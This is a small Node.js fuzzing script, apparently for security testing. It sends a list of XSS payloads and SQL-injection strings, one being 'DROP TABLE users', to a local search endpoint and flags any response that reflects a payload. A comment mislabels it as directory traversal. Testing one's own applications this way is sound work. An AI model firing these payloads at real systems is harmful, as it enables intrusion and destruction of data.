const http = require('http');
const https = require('https');
const url = require('url');
// Directory Traversal
const targetBaseUrl = 'http://localhost:8082/search?q=';

const payloads = [
  `<script>alert(1)</script>`,
  `' OR '1'='1`,
  `" OR "1"="1`,
  `'; DROP TABLE users; --`,
  `<img src=x onerror=alert(1)>`,
  `<svg/onload=alert(1)>`
];

function sendRequest(testUrl) {
  return new Promise((resolve, reject) => {
    const parsedUrl = url.parse(testUrl);
    const lib = parsedUrl.protocol === 'https:' ? https : http;

    lib.get(testUrl, (res) => {
      let data = '';
      res.on('data', chunk => (data += chunk));
      res.on('end', () => {
        resolve({ statusCode: res.statusCode, body: data });
      });
    }).on('error', reject);
  });
}

async function fuzz() {
  for (const payload of payloads) {
    const encodedPayload = encodeURIComponent(payload);
    const testUrl = targetBaseUrl + encodedPayload;

    try {
      const response = await sendRequest(testUrl);
      console.log(`Testando payload: ${payload}`);
      console.log(`URL: ${testUrl}`);
      console.log(`Status: ${response.statusCode} | Tamanho resposta: ${response.body.length}`);

      if (response.body.includes(payload)) {
        console.log('⚠️ Possível vulnerabilidade detectada!');
      }
      console.log('--------------------------------------');
    } catch (err) {
      console.error(`Erro ao testar payload ${payload}:`, err.message);
    }
  }
}

fuzz();
